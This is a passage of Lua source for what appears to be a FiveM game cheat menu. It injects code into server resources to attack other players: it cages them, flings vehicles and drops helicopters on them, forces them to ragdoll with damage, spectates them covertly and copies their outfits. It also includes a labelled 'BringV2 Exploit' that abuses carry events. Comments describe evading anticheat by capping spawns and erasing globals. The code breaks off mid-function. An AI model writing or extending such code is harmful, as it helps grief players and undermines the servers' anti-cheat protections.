                local obj = CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 6.8, coords.y + 1, coords.z - 1.5, false, true, true)
                SetEntityHeading(obj, 90.0)
                CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y + 6.8, coords.z - 1.5, false, true, true)
                CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y - 4.8, coords.z - 1.5, false, true, true)
                local obj2 = CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x + 4.8, coords.y + 1, coords.z - 1.5, false, true, true)
                SetEntityHeading(obj2, 90.0)
                obj = CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 6.8, coords.y + 1, coords.z + 1.3, false, true, true)
                SetEntityHeading(obj, 90.0)
                CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y + 6.8, coords.z + 1.3, false, true, true)
                CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y - 4.8, coords.z + 1.3, false, true, true)
                obj2 = CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x + 4.8, coords.y + 1, coords.z + 1.3, false, true, true)
                SetEntityHeading(obj2, 90.0)
            else
                local obj = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y - 1, coords.z - 1, true, true, true)
                FreezeEntityPosition(obj, true)
                local obj2 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.55, coords.y - 1.05, coords.z - 1, true, true, true)
                SetEntityHeading(obj2, 90.0)
                FreezeEntityPosition(obj2, true)
                local obj3 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y + 0.6, coords.z - 1, true, true, true)
                FreezeEntityPosition(obj3, true)
                local obj4 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x + 1.05, coords.y - 1.05, coords.z - 1, true, true, true)
                SetEntityHeading(obj4, 90.0)
                FreezeEntityPosition(obj4, true)
                local obj5 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y - 1, coords.z + 1.5, true, true, true)
                FreezeEntityPosition(obj5, true)
                local obj6 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.55, coords.y - 1.05, coords.z + 1.5, true, true, true)
                SetEntityHeading(obj6, 90.0)
                FreezeEntityPosition(obj6, true)
                local obj7 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y + 0.6, coords.z + 1.5, true, true, true)
                FreezeEntityPosition(obj7, true)
                local obj8 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x + 1.05, coords.y - 1.05, coords.z + 1.5, true, true, true)
                SetEntityHeading(obj8, 90.0)
                FreezeEntityPosition(obj8, true)
            end
            TriggerEvent('chat:addMessage', { args = { '^2Cage:', 'Cage created! Player ID: %d' } })
        ]], targetId, targetId, targetId, targetId, targetId))
        MachoMenuNotification("Cage", "Cage created! Player ID: " .. targetId)
    else
        MachoMenuNotification("Error", "Please enter a valid player ID!")
    end
end)

-- Blackhole and Drafter spawn script: Vehicle spawn and launch or single drafter spawn
local isBlackholeActive = false
local targetPed = nil
local vehicles = {}

-- Random vehicle model selection (for blackhole)
local vehicleModels = {
    "adder", "comet2", "elegy2", "banshee", "sultan"
}

local function GetRandomVehicleModel()
    return vehicleModels[math.random(1, #vehicleModels)]
end

-- Start Blackhole: Spawn 5 vehicles and launch
local function StartBlackhole(targetPlayerId)
    isBlackholeActive = true
    targetPed = GetPlayerPed(GetPlayerFromServerId(targetPlayerId))
    if not targetPed or not DoesEntityExist(targetPed) then
        MachoMenuNotification("Error", "Player ID " .. targetPlayerId .. " not found!")
        isBlackholeActive = false
        return
    end

    local targetCoords = GetEntityCoords(targetPed)
    vehicles = {}

    -- Spawn 5 vehicles (limit for anticheat)
    for i = 1, 5 do
        local model = GetRandomVehicleModel()
        local modelHash = GetHashKey(model)
        RequestModel(modelHash)
        while not HasModelLoaded(modelHash) do
            Citizen.Wait(0)
        end

        local offsetX = math.random(-5, 5)
        local offsetY = math.random(-5, 5)
        local vehicle = CreateVehicle(modelHash, targetCoords.x + offsetX, targetCoords.y + offsetY, targetCoords.z, 0.0, true, true)
        if DoesEntityExist(vehicle) then
            NetworkRegisterEntityAsNetworked(vehicle)
            local netId = NetworkGetNetworkIdFromEntity(vehicle)
            SetNetworkIdCanMigrate(netId, true)
            SetNetworkIdExistsOnAllMachines(netId, true)
            table.insert(vehicles, vehicle)
        end
        SetModelAsNoLongerNeeded(modelHash)
    end

    MachoMenuNotification("Info", "Blackhole started, target ID: " .. targetPlayerId)

    -- Inject blackhole logic to every client
    MachoInjectResource('monitor', string.format([[
        _G.isBlackholeActive = true
        local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
        if not targetPed or not DoesEntityExist(targetPed) then
            return
        end

        Citizen.CreateThread(function()
            while _G.isBlackholeActive and DoesEntityExist(targetPed) do
                local targetCoords = GetEntityCoords(targetPed)
                local handle, vehicle = FindFirstVehicle()
                local vehicles = {}
                local success
                repeat
                    if DoesEntityExist(vehicle) then
                        local vehCoords = GetEntityCoords(vehicle)
                        if #(targetCoords - vehCoords) < 50.0 then
                            table.insert(vehicles, vehicle)
                        end
                    end
                    success, vehicle = FindNextVehicle(handle)
                until not success
                EndFindVehicle(handle)

                for _, vehicle in ipairs(vehicles) do
                    if DoesEntityExist(vehicle) then
                        NetworkRegisterEntityAsNetworked(vehicle)
                        local netId = NetworkGetNetworkIdFromEntity(vehicle)
                        SetNetworkIdCanMigrate(netId, true)
                        SetNetworkIdExistsOnAllMachines(netId, true)

                        local vehCoords = GetEntityCoords(vehicle)
                        local direction = (targetCoords - vehCoords)
                        local distance = #(targetCoords - vehCoords)
                        if distance > 2.0 then
                            local speed = 25.0
                            local velocity = direction / distance * speed
                            SetEntityVelocity(vehicle, velocity.x, velocity.y, velocity.z + 5.0)
                        end
                    end
                end

                Citizen.Wait(200)
            end
        end)
    ]], targetPlayerId))
end

-- Stop Blackhole
local function StopBlackhole()
    if not isBlackholeActive then
        MachoMenuNotification("Error", "Blackhole is not active!")
        return
    end

    isBlackholeActive = false
    targetPed = nil
    vehicles = {}
    MachoMenuNotification("Info", "Blackhole stopped.")

    -- Inject blackhole stop command to every client
    MachoInjectResource('monitor', [[
        _G.isBlackholeActive = false
    ]])
end

-- Spawn single drafter vehicle
local function SpawnDrafter(targetPlayerId)
    -- Inject vehicle spawn to local client
    MachoInjectResource('monitor', string.format([[
        local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
        if not targetPed or not DoesEntityExist(targetPed) then
            TriggerEvent('chat:addMessage', { args = { '^1Error:', 'Player not found! ID: %d' } })
            return
        end
        local targetCoords = GetEntityCoords(targetPed)
        local model = "drafter"
        local modelHash = GetHashKey(model)
        RequestModel(modelHash)
        while not HasModelLoaded(modelHash) do
            Citizen.Wait(0)
        end
        local offsetX = math.random(-5, 5)
        local offsetY = math.random(-5, 5)
        local vehicle = CreateVehicle(modelHash, targetCoords.x + offsetX, targetCoords.y + offsetY, targetCoords.z, 0.0, true, true)
        if DoesEntityExist(vehicle) then
            NetworkRegisterEntityAsNetworked(vehicle)
            local netId = NetworkGetNetworkIdFromEntity(vehicle)
            SetNetworkIdCanMigrate(netId, true)
            SetNetworkIdExistsOnAllMachines(netId, true)
            TriggerEvent('chat:addMessage', { args = { '^2Info:', 'Drafter vehicle spawned, target ID: %d' } })
        end
        SetModelAsNoLongerNeeded(modelHash)
    ]], targetPlayerId, targetPlayerId, targetPlayerId))

    MachoMenuNotification("Info", "Drafter vehicle spawned, target ID: " .. targetPlayerId)
end

-- MachoMenu Integration
local TargetIdInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID", "e.g., 123")

MachoMenuButton(PlayerManipSection, "Start Blackhole", function()
    if isBlackholeActive then
        MachoMenuNotification("Error", "Blackhole is already active! Stop it first.")
        return
    end
    local targetId = tonumber(MachoMenuGetInputbox(TargetIdInputBoxHandle))
    if not targetId or targetId <= 0 then
        MachoMenuNotification("Error", "Please enter a valid player ID!")
        return
    end
    local targetClientId = GetPlayerFromServerId(targetId)
    if targetClientId == -1 then
        MachoMenuNotification("Error", "Player not found! ID: " .. targetId)
        return
    end
    local ped = GetPlayerPed(targetClientId)
    if not ped or ped <= 0 then
        MachoMenuNotification("Error", "Invalid player ped! ID: " .. targetId)
        return
    end
    StartBlackhole(targetId)
end)

MachoMenuButton(PlayerManipSection, "Stop Blackhole", function()
    StopBlackhole()
end)

MachoMenuButton(PlayerManipSection, "Spawn Vehicle", function()
    local targetId = tonumber(MachoMenuGetInputbox(TargetIdInputBoxHandle))
    if not targetId or targetId <= 0 then
        MachoMenuNotification("Error", "Please enter a valid player ID!")
        return
    end
    local targetClientId = GetPlayerFromServerId(targetId)
    if targetClientId == -1 then
        MachoMenuNotification("Error", "Player not found! ID: " .. targetId)
        return
    end
    local ped = GetPlayerPed(targetClientId)
    if not ped or ped <= 0 then
        MachoMenuNotification("Error", "Invalid player ped! ID: " .. targetId)
        return
    end
    SpawnDrafter(targetId)
end)

-- Global environment cleanup (for anticheat detection)
local function Cleanup()
    _G["GetRandomVehicleModel"] = nil
    _G["StartBlackhole"] = nil
    _G["StopBlackhole"] = nil
    _G["SpawnDrafter"] = nil
    _G["isBlackholeActive"] = nil
    _G["targetPed"] = nil
    _G["vehicles"] = nil
end

Citizen.CreateThread(function()
    Citizen.Wait(1000) -- Cleanup after script loads
    Cleanup()
end)

MachoMenuText(PlayerManipSection, "BringV2 Exploit")

-- EAC ID text input
local EACIDInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target ID", "e.g., 668")

-- Carry Button
MachoMenuButton(PlayerManipSection, "Start BringV2", function()
    local eacID = tonumber(MachoMenuGetInputbox(EACIDInputBoxHandle))
    if eacID and eacID > 0 then
        MachoMenuNotification("Carry System", "Carry process started! ID: " .. eacID)
        MachoInjectResource('monitor', string.format([[
            CreateThread(function()
                Wait(1000)

                local targetId = %d

                -- Start carry animation
                TriggerServerEvent('cmg2_animationsCarry:sync', 127, "missfinale_c2mcs_1", "nm", "fin_c2_mcs_1_camman", "firemans_carry", 0.15, 0.27, 0.63, targetId, 100000, 0.0, 49, 33, 1)

                TriggerEvent('chat:addMessage', { args = { '^2Carry System:', 'Trigger sent! ID: %d' } })

                -- Drop immediately after animation starts
                Wait(20)  -- Adjust this time if needed
                TriggerServerEvent("cmg2_animations:stop", targetId)

                -- Drop complete, send chat message
                TriggerEvent('chat:addMessage', { args = { '^2Carry System:', 'Drop complete! ID: ' .. targetId } })
            end)
        ]], eacID, eacID))
    else
        MachoMenuNotification("Error", "Please enter a valid EAC ID!")
    end
end)

-- All Bring - Safe (Auto brings all players one by one)
MachoMenuButton(PlayerManipSection, "All Bring - Safe", function()
    MachoInjectResource('monitor', [[
        CreateThread(function()
            Wait(1000)

            local myPed = PlayerPedId()
            local myCoords = GetEntityCoords(myPed)
            local players = GetActivePlayers()
            local brought = 0
            local totalPlayers = 0

            -- Count how many players we need to bring
            for _, pid in ipairs(players) do
                if pid ~= PlayerId() then
                    local ped = GetPlayerPed(pid)
                    if DoesEntityExist(ped) then
                        totalPlayers = totalPlayers + 1
                    end
                end
            end

            if totalPlayers == 0 then
                TriggerEvent('chat:addMessage', { args = { '^1All Bring:', 'No players found to bring!' } })
                return
            end

            TriggerEvent('chat:addMessage', { args = { '^2All Bring:', 'Bringing ' .. totalPlayers .. ' players to you...' } })

            -- Bring each player one by one
            for _, pid in ipairs(players) do
                if pid ~= PlayerId() then
                    local ped = GetPlayerPed(pid)
                    if DoesEntityExist(ped) then
                        local targetCoords = GetEntityCoords(ped)
                        local targetName = GetPlayerName(pid)
                        local serverId = GetPlayerServerId(pid)
                        
                        -- Teleport to target
                        SetEntityCoords(myPed, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
                        Wait(150)
                        
                        -- Carry them
                        TriggerEvent('m3-smallresources:CarryHideInTrunk:carryPlayer')
                        Wait(500)
                        
                        -- Teleport back to your position
                        SetEntityCoords(myPed, myCoords.x, myCoords.y, myCoords.z, false, false, false, true)
                        Wait(200)
                        
                        -- Drop them automatically
                        TriggerEvent('m3-smallresources:CarryHideInTrunk:dropPlayer')
                        TriggerServerEvent('m3-smallresources:CarryHideInTrunk:dropPlayer', serverId)
                        
                        brought = brought + 1
                        print(">> Brought " .. targetName .. " (" .. brought .. "/" .. totalPlayers .. ")")
                        TriggerEvent('chat:addMessage', { args = { '^2All Bring:', 'Brought ' .. targetName .. ' (' .. brought .. '/' .. totalPlayers .. ')' } })
                        
                        Wait(300) -- Small delay before next player
                    end
                end
            end

            print(">> All " .. brought .. " players brought to you!")
            TriggerEvent('chat:addMessage', { args = { '^2All Bring:', '✅ All ' .. brought .. ' players brought to your location!' } })
        end)
    ]])

    MachoMenuNotification("All Bring", "Bringing all players to you one by one...")
end)

-- RainCar Spawn
MachoMenuText(PlayerManipSection, "RainCar Spawn")
local VehicleModelInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Vehicle Model", "Enter vehicle name")

-- Start Button
MachoMenuButton(PlayerManipSection, "Start Vehicle Rain", function()
    local model = MachoMenuGetInputbox(VehicleModelInputBoxHandle)
    if model == nil or model == "" then
        MachoMenuNotification("Error", "Please enter a valid vehicle model!")
        return
    end

    MachoInjectResource("monitor", string.format([[
        if careverActive then
            print("Carever is already running.")
            return
        end

        local vehicleModel = "%s"
        careverActive = true

        Citizen.CreateThread(function()
            while careverActive do
                RequestModel(vehicleModel)
                while not HasModelLoaded(vehicleModel) do
                    Wait(100)
                end

                local playerList = GetActivePlayers()
                for _, playerId in ipairs(playerList) do
                    local ped = GetPlayerPed(playerId)
                    local pos = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)

                    local vehicle = CreateVehicle(vehicleModel, pos.x, pos.y, pos.z, heading, true, false)
                    SetEntityAsNoLongerNeeded(vehicle)
                end

                Citizen.Wait(350)
            end
        end)
    ]], model))
    MachoMenuNotification("Troll", "Vehicle rain started for everyone with model: " .. model)
end)

-- Stop Button
MachoMenuButton(PlayerManipSection, "Stop Vehicle Rain", function()
    MachoInjectResource("monitor", [[
        careverActive = false
        print("Car ever has been stopped.")
    ]])
    MachoMenuNotification("Troll", "Vehicle rain has been stopped.")
end)

-- Helicopter Spawn
MachoMenuText(PlayerManipSection, "Helicopter Spawn")

-- Global variables
local isHelicopterSpawning = false
local helicopterSpawnThread = nil

-- Target player ID input
local HelicopterLoopTargetInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Helicopter Rain ID", "e.g., 123")

-- Start Helicopter Rain
MachoMenuButton(PlayerManipSection, "Start Helicopter Rain", function()
    local targetId = tonumber(MachoMenuGetInputbox(HelicopterLoopTargetInputBoxHandle))
    if not targetId or targetId <= 0 then
        MachoMenuNotification("Error", "Please enter a valid player ID!")
        return
    end

    if isHelicopterSpawning then
        MachoMenuNotification("Warning", "Already started. Use stop button to end.")
        return
    end

    isHelicopterSpawning = true
    MachoMenuNotification("Helicopter System", "Rain started! Target ID: " .. targetId)

    helicopterSpawnThread = CreateThread(function()
        while isHelicopterSpawning do
            MachoInjectResource('monitor', string.format([[
                local helicopterModel = "volatus"
                local targetPlayer = GetPlayerFromServerId(%d)
                if targetPlayer == -1 then return end
                local targetPed = GetPlayerPed(targetPlayer)
                if not DoesEntityExist(targetPed) then return end
                local coords = GetEntityCoords(targetPed)
                local heading = GetEntityHeading(targetPed)
                RequestModel(helicopterModel)
                while not HasModelLoaded(helicopterModel) do Wait(100) end
                local helicopter = CreateVehicle(GetHashKey(helicopterModel), coords.x, coords.y, coords.z + 10.0, heading, true, false)
                if DoesEntityExist(helicopter) then
                    SetVehicleEngineOn(helicopter, true, true, false)
                    SetEntityVelocity(helicopter, 0.0, 0.0, -50.0)
                end
            ]], targetId))
            Wait(1000) -- Every 4 seconds
        end
    end)
end)

-- Stop Helicopter Rain
MachoMenuButton(PlayerManipSection, "Stop Helicopter Rain", function()
    if isHelicopterSpawning then
        isHelicopterSpawning = false
        helicopterSpawnThread = nil
        MachoMenuNotification("Helicopter System", "Helicopter rain stopped.")
    else
        MachoMenuNotification("Info", "Already stopped.")
    end
end)

-- ============================================================
-- SPECTATE PLAYER (Selected Player)
-- ============================================================

local spectateActive = false
local spectateTargetId = nil
local SpectateInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Spectate)", "e.g., 123")

MachoMenuButton(PlayerManipSection, "Spectate Player", function()
    local targetId = tonumber(MachoMenuGetInputbox(SpectateInputBoxHandle))
    
    if not targetId or targetId <= 0 then
        MachoMenuNotification("Error", "Please enter a valid player ID!")
        return
    end
    
    if not spectateActive then
        -- Start spectating
        local targetResource = nil
        if GetResourceState('monitor') == "started" then
            targetResource = 'monitor'
        elseif GetResourceState('qb-core') == "started" then
            targetResource = 'qb-core'
        else
            targetResource = 'ox_inventory'
        end
        
        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Spectate: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Spectate:', 'Player not found! ID: ' .. targetServerId } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Spectate: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Spectate:', 'Target player not in game! ID: ' .. targetServerId } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Spectate: Cannot spectate self!")
                TriggerEvent('chat:addMessage', { args = { '^1Spectate:', 'You cannot spectate yourself!' } })
                return
            end
            
            _G.spectateActive = true
            _G.spectateTargetPed = targetPed
            _G.spectateTargetId = targetServerId
            
            NetworkSetInSpectatorMode(true, targetPed)
            SetEntityVisible(PlayerPedId(), false, false)
            FreezeEntityPosition(PlayerPedId(), true)
            
            local targetName = GetPlayerName(targetPlayer)
            print("Spectate: Spectating " .. targetName)
            TriggerEvent('chat:addMessage', { args = { '^2Spectate:', 'Spectating ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
        ]], targetId))
        
        spectateActive = true
        spectateTargetId = targetId
        MachoMenuNotification("Spectate", "Spectating player ID: " .. targetId)
        
    else
        -- Stop spectating
        local targetResource = nil
        if GetResourceState('monitor') == "started" then
            targetResource = 'monitor'
        elseif GetResourceState('qb-core') == "started" then
            targetResource = 'qb-core'
        else
            targetResource = 'ox_inventory'
        end
        
        MachoInjectResource2(NewThreadNs, targetResource, [[
            if _G.spectateActive then
                _G.spectateActive = false
                _G.spectateTargetPed = nil
                _G.spectateTargetId = nil
                
                NetworkSetInSpectatorMode(false, PlayerPedId())
                SetEntityVisible(PlayerPedId(), true, false)
                FreezeEntityPosition(PlayerPedId(), false)
                
                print("Spectate: Stopped spectating")
                TriggerEvent('chat:addMessage', { args = { '^2Spectate:', 'Stopped spectating' } })
            end
        ]])
        
        spectateActive = false
        spectateTargetId = nil
        MachoMenuNotification("Spectate", "Spectate stopped")
    end
end)

-- Stop Spectate (Separate Button)
MachoMenuButton(PlayerManipSection, "Stop Spectate", function()
    if spectateActive then
        local targetResource = nil
        if GetResourceState('monitor') == "started" then
            targetResource = 'monitor'
        elseif GetResourceState('qb-core') == "started" then
            targetResource = 'qb-core'
        else
            targetResource = 'ox_inventory'
        end
        
        MachoInjectResource2(NewThreadNs, targetResource, [[
            if _G.spectateActive then
                _G.spectateActive = false
                _G.spectateTargetPed = nil
                _G.spectateTargetId = nil
                
                NetworkSetInSpectatorMode(false, PlayerPedId())
                SetEntityVisible(PlayerPedId(), true, false)
                FreezeEntityPosition(PlayerPedId(), false)
                
                print("Spectate: Stopped spectating")
                TriggerEvent('chat:addMessage', { args = { '^2Spectate:', 'Stopped spectating' } })
            end
        ]])
        
        spectateActive = false
        spectateTargetId = nil
        MachoMenuNotification("Spectate", "Spectate stopped")
    else
        MachoMenuNotification("Spectate", "Not currently spectating")
    end
end)

-- Alternative: Toggle Spectate (One Button)
local spectateToggleActive = false
local SpectateToggleInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Spectate Toggle)", "e.g., 123")

MachoMenuButton(PlayerManipSection, "Spectate Toggle", function()
    local targetId = tonumber(MachoMenuGetInputbox(SpectateToggleInputBoxHandle))
    
    if not targetId or targetId <= 0 then
        MachoMenuNotification("Error", "Please enter a valid player ID!")
        return
    end
    
    -- Toggle spectate on/off with the same button
    MachoInjectResource2(NewThreadNs, 'monitor', string.format([[
        local targetServerId = %d
        
        if not _G.spectateActive then
            -- Start spectating
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Spectate: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Spectate:', 'Player not found! ID: %d' } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Spectate: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Spectate:', 'Target player not in game! ID: %d' } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Spectate: Cannot spectate self!")
                TriggerEvent('chat:addMessage', { args = { '^1Spectate:', 'You cannot spectate yourself!' } })
                return
            end
            
            _G.spectateActive = true
            _G.spectateTargetPed = targetPed
            _G.spectateTargetId = targetServerId
            
            NetworkSetInSpectatorMode(true, targetPed)
            SetEntityVisible(PlayerPedId(), false, false)
            FreezeEntityPosition(PlayerPedId(), true)
            
            local targetName = GetPlayerName(targetPlayer)
            print("Spectate: Spectating " .. targetName)
            TriggerEvent('chat:addMessage', { args = { '^2Spectate:', 'Spectating ' .. targetName .. ' (ID: %d)' } })
        else
            -- Stop spectating
            _G.spectateActive = false
            _G.spectateTargetPed = nil
            _G.spectateTargetId = nil
            
            NetworkSetInSpectatorMode(false, PlayerPedId())
            SetEntityVisible(PlayerPedId(), true, false)
            FreezeEntityPosition(PlayerPedId(), false)
            
            print("Spectate: Stopped spectating")
            TriggerEvent('chat:addMessage', { args = { '^2Spectate:', 'Stopped spectating' } })
        end
    ]], targetId, targetId, targetId))
    
    if not spectateToggleActive then
        spectateToggleActive = true
        MachoMenuNotification("Spectate", "Spectating player ID: " .. targetId)
    else
        spectateToggleActive = false
        MachoMenuNotification("Spectate", "Spectate stopped")
    end
end)

-- ============================================================
-- S1 TELEPORT TO PLAYER (Selected Player)
-- ============================================================

local TeleportPlayerInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (S1 Teleport)", "e.g., 123")

MachoMenuButton(PlayerManipSection, "S1 Teleport to Player", function()
    local targetId = tonumber(MachoMenuGetInputbox(TeleportPlayerInputBoxHandle))
    
    if not targetId or targetId <= 0 then
        MachoMenuNotification("Error", "Please enter a valid player ID!")
        return
    end
    
    MachoMenuNotification("S1 Teleport", "Teleporting to player ID: " .. targetId)
    
    local targetResource = nil
    if GetResourceState('monitor') == "started" then
        targetResource = 'monitor'
    elseif GetResourceState('qb-core') == "started" then
        targetResource = 'qb-core'
    else
        targetResource = 'ox_inventory'
    end
    
    MachoInjectResource2(NewThreadNs, targetResource, string.format([[
        local targetServerId = %d
        local targetPlayer = GetPlayerFromServerId(targetServerId)
        
        if not targetPlayer then
            print("S1 Teleport: Player not found!")
            TriggerEvent('chat:addMessage', { args = { '^1S1 Teleport:', 'Player not found! ID: ' .. targetServerId } })
            return
        end
        
        local targetPed = GetPlayerPed(targetPlayer)
        if not targetPed or not DoesEntityExist(targetPed) then
            print("S1 Teleport: Target ped not found!")
            TriggerEvent('chat:addMessage', { args = { '^1S1 Teleport:', 'Target player not in game! ID: ' .. targetServerId } })
            return
        end
        
        if targetPed == PlayerPedId() then
            print("S1 Teleport: Cannot teleport to self!")
            TriggerEvent('chat:addMessage', { args = { '^1S1 Teleport:', 'You cannot teleport to yourself!' } })
            return
        end
        
        local myPed = PlayerPedId()
        local targetName = GetPlayerName(targetPlayer)
        
        if not IsPedInAnyVehicle(targetPed, false) then
            local coords = GetEntityCoords(targetPed)
            SetEntityCoords(myPed, coords.x, coords.y, coords.z + 1.0)
            print("S1 Teleport: Teleported to " .. targetName)
            TriggerEvent('chat:addMessage', { args = { '^2S1 Teleport:', 'Teleported to ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
        else
            local veh = GetVehiclePedIsIn(targetPed, false)
            if DoesEntityExist(veh) then
                local seatToUse = nil
                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(veh))
                
                for i = -1, maxSeats - 2 do
                    if IsVehicleSeatFree(veh, i) then
                        seatToUse = i
                        break
                    end
                end
                
                if seatToUse ~= nil then
                    SetPedIntoVehicle(myPed, veh, seatToUse)
                    print("S1 Teleport: Teleported into " .. targetName .. "'s vehicle")
                    TriggerEvent('chat:addMessage', { args = { '^2S1 Teleport:', 'Teleported into ' .. targetName .. "'s vehicle (ID: " .. targetServerId .. ")" } })
                else
                    local coords = GetEntityCoords(veh)
                    SetEntityCoords(myPed, coords.x, coords.y, coords.z + 1.0)
                    print("S1 Teleport: Teleported to " .. targetName .. "'s vehicle")
                    TriggerEvent('chat:addMessage', { args = { '^2S1 Teleport:', 'Teleported to ' .. targetName .. "'s vehicle (ID: " .. targetServerId .. ")" } })
                end
            else
                local coords = GetEntityCoords(targetPed)
                SetEntityCoords(myPed, coords.x, coords.y, coords.z + 1.0)
                print("S1 Teleport: Teleported to " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^2S1 Teleport:', 'Teleported to ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
            end
        end
    ]], targetId))
end)

-- ============================================================
-- S1 FORCE FALL ONCE (Selected Player)
-- ============================================================

local ForceFallInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Force Fall)", "e.g., 123")

MachoMenuButton(PlayerManipSection, "S1 Force Fall Once", function()
    local targetId = tonumber(MachoMenuGetInputbox(ForceFallInputBoxHandle))
    
    if not targetId or targetId <= 0 then
        MachoMenuNotification("Error", "Please enter a valid player ID!")
        return
    end
    
    MachoMenuNotification("Force Fall", "Forcing player ID: " .. targetId .. " to fall")
    
    local targetResource = nil
    if GetResourceState('monitor') == "started" then
        targetResource = 'monitor'
    elseif GetResourceState('qb-core') == "started" then
        targetResource = 'qb-core'
    else
        targetResource = 'ox_inventory'
    end
    
    MachoInjectResource2(NewThreadNs, targetResource, string.format([[
        local targetServerId = %d
        local targetPlayer = GetPlayerFromServerId(targetServerId)
        
        if not targetPlayer then
            print("Force Fall: Player not found!")
            TriggerEvent('chat:addMessage', { args = { '^1Force Fall:', 'Player not found! ID: ' .. targetServerId } })
            return
        end
        
        local targetPed = GetPlayerPed(targetPlayer)
        if not targetPed or not DoesEntityExist(targetPed) then
            print("Force Fall: Target ped not found!")
            TriggerEvent('chat:addMessage', { args = { '^1Force Fall:', 'Target player not in game! ID: ' .. targetServerId } })
            return
        end
        
        if targetPed == PlayerPedId() then
            print("Force Fall: Cannot target self!")
            TriggerEvent('chat:addMessage', { args = { '^1Force Fall:', 'You cannot target yourself!' } })
            return
        end
        
        SetPedToRagdoll(targetPed, 3000, 3000, 0, true, true, false)
        ApplyDamageToPed(targetPed, 10, false, GetHashKey("WEAPON_FIRE"))
        
        local targetName = GetPlayerName(targetPlayer)
        print("Force Fall: Forced " .. targetName .. " to fall")
        TriggerEvent('chat:addMessage', { args = { '^2Force Fall:', 'Forced ' .. targetName .. ' (ID: ' .. targetServerId .. ') to fall' } })
    ]], targetId))
end)

-- ============================================================
-- S1 COPY OUTFIT (Selected Player)
-- ============================================================

local CopyOutfitInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Copy Outfit)", "e.g., 123")

MachoMenuButton(PlayerManipSection, "S1 Copy Outfit", function()
    local targetId = tonumber(MachoMenuGetInputbox(CopyOutfitInputBoxHandle))
    
    if not targetId or targetId <= 0 then
        MachoMenuNotification("Error", "Please enter a valid player ID!")
        return
    end
    
    MachoMenuNotification("Copy Outfit", "Copying outfit from ID: " .. targetId)
    
    local targetResource = nil
    if GetResourceState('monitor') == "started" then
        targetResource = 'monitor'
    elseif GetResourceState('qb-core') == "started" then
        targetResource = 'qb-core'
    else
        targetResource = 'ox_inventory'
    end
    
    MachoInjectResource2(NewThreadNs, targetResource, string.format([[
        local targetServerId = %d
        local targetPlayer = GetPlayerFromServerId(targetServerId)
        
        if not targetPlayer then
            print("Copy Outfit: Player not found!")
            TriggerEvent('chat:addMessage', { args = { '^1Copy Outfit:', 'Player not found! ID: ' .. targetServerId } })
            return
        end
        
        local targetPed = GetPlayerPed(targetPlayer)
        if not targetPed or not DoesEntityExist(targetPed) then
            print("Copy Outfit: Target ped not found!")
            TriggerEvent('chat:addMessage', { args = { '^1Copy Outfit:', 'Target player not in game! ID: ' .. targetServerId } })
            return
        end
        
        if targetPed == PlayerPedId() then
            print("Copy Outfit: Cannot copy from self!")
            TriggerEvent('chat:addMessage', { args = { '^1Copy Outfit:', 'You cannot copy from yourself!' } })
            return
        end
        
        local myPed = PlayerPedId()
        local modelmy = GetEntityModel(myPed)
        local model = GetEntityModel(targetPed)
        
        if modelmy ~= model then
            RequestModel(model)
            local timeout = 0
            while not HasModelLoaded(model) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(model) then
                SetPlayerModel(PlayerId(), model)
                SetPedDefaultComponentVariation(myPed)
            else
                print("Copy Outfit: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Copy Outfit:', 'Failed to load model!' } })
                return
            end
        end
        
        for i = 0, 12 do
            local drawable = GetPedDrawableVariation(targetPed, i)
            local texture = GetPedTextureVariation(targetPed, i)
            local palette = GetPedPaletteVariation(targetPed, i)
